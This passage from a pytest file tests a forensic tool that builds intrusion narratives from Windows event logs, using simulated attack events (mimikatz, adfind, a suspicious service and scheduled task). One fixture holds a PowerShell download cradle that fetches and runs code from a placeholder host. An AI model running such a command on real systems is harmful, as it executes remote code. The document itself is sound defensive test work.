    # and the story of the account used on the network holds the logon that set it, by its name there
    assert {r: s for s in bob["steps"] for r in s["refs"]}["event:3"]["tie"]["kind"] == "identity"
    assert record_phase({**SEC, "eventId": 4624, "logonType": 9, "targetUser": "x", "targetOutboundUser": "x"}, "events", set())[0] is None


# --- the API ------------------------------------------------------------------------------------------

import json  # noqa: E402
import uuid  # noqa: E402

import pytest  # noqa: E402
from django.test import Client, override_settings  # noqa: E402

from services.store.casestore import StoreRegistry  # noqa: E402
from services.store.writers import EventWriter  # noqa: E402

HDR = {"HTTP_X_FORENSIC_CLIENT": "1"}


@pytest.fixture
def registry(tmp_path):
    reg = StoreRegistry()
    reg.configure(tmp_path / "cases")
    yield reg
    reg.close_all()


def _post(body):
    return Client().post("/api/stories/build", json.dumps(body), content_type="application/json", **HDR)


def test_the_api_builds_from_posted_rows_and_returns_the_chains_with_the_stories():
    events, findings = _intrusion()
    r = _post({"events": events, "mails": [], "findings": findings, "settings": SETTINGS, "gapHours": 48})
    assert r.status_code == 200, r.content
    body = r.json()
    assert [s["subject"]["label"] for s in body["stories"]] == [DANIEL] and body["version"] == 1
    assert set(body["chains"]) == {"chains", "stats"} and body["stats"]["stories"] == 1
    assert _post({"events": "x"}).status_code == 400
    assert _post({"storeKey": str(uuid.uuid4())}).status_code == 404


def test_a_server_case_selects_its_rows_by_sql_and_reads_the_same_story(registry, monkeypatch):
    events, findings = _intrusion()
    # the store numbers rows as they are written: the findings cite those numbers
    events.sort(key=lambda e: e["id"])
    renumber = {e["id"]: i for i, e in enumerate(events, 1)}
    key = str(uuid.uuid4())
    store = registry.get(key)
    writer = EventWriter(store, 1)
    for e in events:
        writer.add({k: v for k, v in e.items() if k != "id"})
    writer.flush()
    for f in findings:
        f["refs"] = [renumber[r] for r in f["refs"]]
    monkeypatch.setattr("api.views.stories.registry", registry)
    r = _post({"storeKey": key, "findings": findings, "settings": SETTINGS})
    assert r.status_code == 200, r.content
    [story] = r.json()["stories"]
    rows = [{**e, "id": renumber[e["id"]]} for e in events]
    [direct] = build_stories(rows, [], findings, SETTINGS)["stories"]
    assert story["id"] == direct["id"] and [s["refs"] for s in story["steps"]] == [s["refs"] for s in direct["steps"]]
    assert r.json()["stats"]["truncated"] == []
    with override_settings(FORENSIC_BROWSER_ONLY=True):
        assert _post({"storeKey": key, "findings": findings}).status_code == 403


def test_a_cut_server_selection_reads_the_foothold_and_what_is_nearest_the_flag_first(registry, monkeypatch):
    from services.analysis import stories as S

    host = "WS-001.northstar.example"
    me = dict(subjectUser="alice.martin", subjectDomain="NORTHSTAR", subjectLogonId="0x9001")
    events = [
        ev(5, -1, eventId=4624, computer=host, targetUser="alice.martin", targetDomain="NORTHSTAR", targetLogonId="0x9001", logonType=2),
        ev(1, 0, eventId=4688, computer=host, newProcessId="0x10", processName="C:\\Users\\Public\\mimikatz.exe", **me),
        ev(2, 120, eventId=4688, computer=host, newProcessId="0x11", processName="C:\\Users\\Public\\adfind.exe", subjectUser="bob", subjectDomain="NORTHSTAR", subjectLogonId="0x7001"),
        # a scheduled task twenty hours later
        ev(99, 20 * 60, eventId=4698, computer=host, taskName="\\Updater", **me),
        # thirty programs of the session in the hour before the flag, thirty in the minutes after it
        *[ev(100 + i, -50 + i * 0.5, eventId=4688, computer=host, newProcessId=hex(0x100 + i), processName="C:\\Windows\\System32\\conhost.exe", **me) for i in range(30)],
        *[ev(200 + i, 1 + i * 0.5, eventId=4688, computer=host, newProcessId=hex(0x200 + i), processName="C:\\Windows\\System32\\conhost.exe", **me) for i in range(30)],
    ]  # fmt: skip
    store = registry.get(str(uuid.uuid4()))
    writer = EventWriter(store, 1, preserve_ids=True)
    for e in events:
        writer.add({**e, "recordKey": None})
    writer.flush()
    monkeypatch.setattr(S, "EVENT_CAP", 20)
    monkeypatch.setattr(S, "NAME_KEYS", 1)
    findings = [finding("win-mimikatz", "critical", [1], tags=["credential-access"]), finding("win-adfind", "medium", [2], tags=["discovery"])]
    res = S.stories_for_store(store, SETTINGS, findings)
    [story] = [s for s in res["stories"] if s["subject"]["label"] == "northstar\\alice.martin"]
    # the cut keeps the task, then the records nearest the flag, not the first in time
    assert {"event:99", "event:200"} <= _refs(story) and "event:100" not in _refs(story)
    # and says which selections were cut, the names read around the flags among them
    assert {"identities", "hosts", "name-keys"} <= set(res["stats"]["truncated"])


def test_a_server_case_reads_the_domain_controllers_records_of_the_flagged_host_and_its_logons(registry, monkeypatch):
    """A service flagged on FS-001: the domain controller is not flagged, and its tickets and NTLM
    validations of FS-001, of the accounts that logged on to it and of their addresses are read."""
    from services.analysis import stories as S

    fs = "FS-001.northstar.example"
    events = [
        ev(1, 0, eventId=4624, computer=fs, targetUser="lab.admin", targetDomain="NORTHSTAR", targetLogonId="0x77", logonType=3, ipAddress="10.0.0.21",
           authPackage="Kerberos"),
        ev(2, 0.1, eventId=5140, computer=fs, subjectUser="lab.admin", subjectDomain="NORTHSTAR", subjectLogonId="0x77", shareName="\\\\*\\ADMIN$"),
        ev(3, 1, base=SCM, eventId=7045, computer=fs, serviceName="upd", serviceFile="C:\\Windows\\upd.exe"),
        # the domain controller: lab.admin's ticket for FS-001, another account's, an NTLM validation from FS-001 ...
        ev(10, -0.02, eventId=4769, computer=DC, targetUser="lab.admin@NORTHSTAR.EXAMPLE", serviceName="FS-001$", ipAddress="10.0.0.21", status="0x0"),
        ev(11, 5, eventId=4769, computer=DC, targetUser="svc.backup@NORTHSTAR.EXAMPLE", serviceName="FS-001$", ipAddress="10.0.0.30", status="0x0"),
        ev(12, 10, eventId=4776, computer=DC, targetUser="svc.scan", workstation="FS-001", status="0x0"),
        # ... the ticket of the machine at lab.admin's address, which says whose address it is ...
        ev(13, -30, eventId=4768, computer=DC, targetUser="WS-001$", targetDomain="NORTHSTAR.EXAMPLE", ipAddress="10.0.0.21", status="0x0"),
        # ... and neither someone else's ticket nor lab.admin's ten days later
        ev(14, 2, eventId=4769, computer=DC, targetUser="zoe@NORTHSTAR.EXAMPLE", serviceName="FS-009$", ipAddress="10.0.0.77", status="0x0"),
        ev(15, 10 * 24 * 60, eventId=4769, computer=DC, targetUser="lab.admin@NORTHSTAR.EXAMPLE", serviceName="FS-001$", ipAddress="10.0.0.21", status="0x0"),
    ]  # fmt: skip
    store = registry.get(str(uuid.uuid4()))
    writer = EventWriter(store, 1, preserve_ids=True)
    for e in events:
        writer.add({**e, "recordKey": None})
    writer.flush()
    read: list[list[int]] = []
    build = S.build_stories

    def spy(rows, *a, **kw):
        read.append(sorted(r["id"] for r in rows))
        return build(rows, *a, **kw)

    monkeypatch.setattr(S, "build_stories", spy)
    findings = [finding("win-service-installed-suspicious", "high", [3], tags=["persistence"])]
    res = S.stories_for_store(store, SETTINGS, findings)
    assert read[-1] == [1, 2, 3, 10, 11, 12, 13] and res["stats"]["truncated"] == []
    # the machine's ticket names the address's host: the way into FS-001 came from WS-001, with lab.admin's ticket
    hops = [h for s in res["stories"] for h in s["lineage"]["hops"] if h["to"] == "fs-001"]
    assert hops and all(h["from"]["host"] == "ws-001" for h in hops)
    assert any("event:10" in h["refs"] for h in hops)
    # past its cap, the records naming a flagged account or host are read before those only from an address
    monkeypatch.setattr(S, "DC_CAP", 3)
    res = S.stories_for_store(store, SETTINGS, findings)
    assert read[-1] == [1, 2, 3, 10, 11, 12] and res["stats"]["truncated"] == ["dc"]


def test_the_api_holds_the_sizes_it_is_asked_for_to_bounds():
    from api.views.stories import _opts

    asked = {"maxSteps": 10**9, "maxStories": "5000000", "gapHours": "inf", "seedMinRisk": -3}
    assert _opts(asked) == {"max_steps": 2000, "max_stories": 1000, "gap_hours": 720.0, "seed_min_risk": 0}
    assert _opts({"max_steps": 0, "gapHours": "nan", "maxStories": "many"}) == {"max_steps": 1}


def test_a_server_case_reads_who_is_who_on_the_whole_case(registry):
    """The rows read around the flags are a few days of the case; the accounts are those of all of it."""
    from services.analysis.stories import stories_for_store

    sid = "S-1-5-21-111-222-333-1107"
    ps = {"provider": "Microsoft-Windows-PowerShell", "channel": "Microsoft-Windows-PowerShell/Operational"}
    events = [
        # a week before, on another host: the logon that says whose SID it is
        ev(1, -7 * 24 * 60, eventId=4624, computer="WS-009.northstar.example", targetUser="daniel.roy", targetDomain="NORTHSTAR", targetSid=sid, targetLogonId="0x10", logonType=2),
        # a script block on WS-004 names its user only by that SID
        ev(2, 0, base=ps, eventId=4104, computer="WS-004.northstar.example", userSid=sid, scriptBlockText="IEX (New-Object Net.WebClient).DownloadString('http://x')"),
        # a task created by a bare 'admin': in the days read, WS-004's local admin is the only admin...
        ev(3, 10, eventId=4698, computer="WS-004.northstar.example", subjectUser="admin", taskName="\\Updater"),
        ev(4, 20, eventId=4624, computer="WS-004.northstar.example", targetUser="admin", targetDomain="WS-004", targetLogonId="0x20", logonType=2),
        # ...but a month before, the domain has one too
        ev(5, -30 * 24 * 60, eventId=4624, computer="WS-009.northstar.example", targetUser="admin", targetDomain="NORTHSTAR", targetLogonId="0x30", logonType=2),
    ]  # fmt: skip
    findings = [
        finding("ps-download-cradle", "high", [2], tags=["execution"]),
        finding("win-scheduled-task-suspicious-content", "high", [3], tags=["persistence"]),
    ]
    store = registry.get(str(uuid.uuid4()))
    writer = EventWriter(store, 1, preserve_ids=True)
    for e in events:
        writer.add({**e, "recordKey": None})
    writer.flush()
    res = stories_for_store(store, SETTINGS, findings)
    assert res["stats"]["events"] == 3 and res["stats"]["truncated"] == []
    by_subject = {s["subject"]["label"]: s for s in res["stories"] if s["kind"] == "person"}
    # the SID is daniel's, though the logon that says so is not among the rows read
    assert "event:2" in {r for st in by_subject["northstar\\daniel.roy"]["steps"] for r in st["refs"]}
    # a bare admin is either of two accounts: the story is of the bare name, not of WS-004's admin
    assert "admin" in by_subject and "ws-004\\admin" not in by_subject
    assert not [s for s in res["stories"] if s["kind"] == "host"]
    # the rows read alone would have said otherwise
    rows = [e for e in events if e["id"] in (2, 3, 4)]
    alone = {s["subject"]["label"] for s in build_stories(rows, [], findings, SETTINGS)["stories"]}
    assert "ws-004\\admin" in alone and "northstar\\daniel.roy" not in alone


def test_the_browser_sends_every_field_the_story_engine_reads():
    """stories.ts sends only these fields of an event, and these keys of its data; a field read here
    and missing there would silently change a browser case's stories, so the lists are compared."""
    import re
    from pathlib import Path

    root = Path(__file__).resolve().parents[2]
    py = "".join((root / f"backend/services/analysis/{m}.py").read_text(encoding="utf-8") for m in ("identity", "lineage", "stories"))
    ts = (root / "frontend/src/data/stories.ts").read_text(encoding="utf-8")

    def listed(name: str) -> set[str]:
        start = ts.index(f"export const {name}")
        return set(re.findall(r"'([^']+)'", ts[start : ts.index("] as const", start)]))

    # the mails' fields, and what records_for_store computes in SQL
    mail_only = {"date", "fromAddr", "fromName", "replyTo", "urls", "attachments", "messageId", "subject", "first", "n", "hostDomain"}
    fields = set(re.findall(r"""\b(?:ev|row)\.get\(["']([A-Za-z]+)["']""", py)) - mail_only
    data = set(re.findall(r"""(?:\bdata|\bd|_data\(\w+\))\.get\(["']([A-Za-z. ]+)["']""", py))
    chain_keys = set(
        re.findall(
            r"'([^']+)'", (root / "frontend/src/data/chains.ts").read_text(encoding="utf-8").split("export const CHAIN_DATA_KEYS")[1].split("] as const")[0]
        )
    )
    assert fields and fields <= listed("STORY_EVENT_FIELDS"), sorted(fields - listed("STORY_EVENT_FIELDS"))
    assert data and data <= listed("STORY_DATA_KEYS") | chain_keys, sorted(data - listed("STORY_DATA_KEYS") - chain_keys)
    # the hosts' records the SQL selection reads are the ones the page reads
    from services.analysis.stories import LINEAGE_EVENT_IDS

    block = ts[ts.index("export const LINEAGE_EVENT_IDS") :]
    assert {int(x) for x in re.findall(r"\d+", block[: block.index("]")])} == set(LINEAGE_EVENT_IDS)
    from services.analysis.stories import DC_AUTH_EVENT_IDS

    block = ts[ts.index("export const DC_AUTH_EVENT_IDS") :]
    assert [int(x) for x in re.findall(r"\d+", block[: block.index("]")])] == list(DC_AUTH_EVENT_IDS)
    from services.analysis.stories import LINEAGE_CHANNEL_EVENTS, PRIVATE_ANSWER, REMOTE_SCRIPT

    block = ts[ts.index("export const LINEAGE_CHANNEL_EVENTS") :]
    block = block[: block.index("\n]")]
    assert [(c, tuple(int(i) for i in ids.split(","))) for c, ids in re.findall(r"\['([a-z-]+)', \[([\d, ]+)\]\]", block)] == list(LINEAGE_CHANNEL_EVENTS)
    for name, value in (("REMOTE_SCRIPT", REMOTE_SCRIPT), ("PRIVATE_ANSWER", PRIVATE_ANSWER)):
        literal = re.search(rf"export const {name} = '([^']*)'", ts).group(1)
        assert literal.replace("\\\\", "\\") == value, name
    # and a cut selection reads the same records first
    from services.analysis.stories import WEIGHTY_EVENT_IDS, WEIGHTY_OPERATIONS

    block = ts[ts.index("export const WEIGHTY_EVENT_IDS") :]
    assert [int(x) for x in re.findall(r"\d+", block[: block.index("]")])] == list(WEIGHTY_EVENT_IDS)
    assert listed("WEIGHTY_OPERATIONS") == set(WEIGHTY_OPERATIONS)
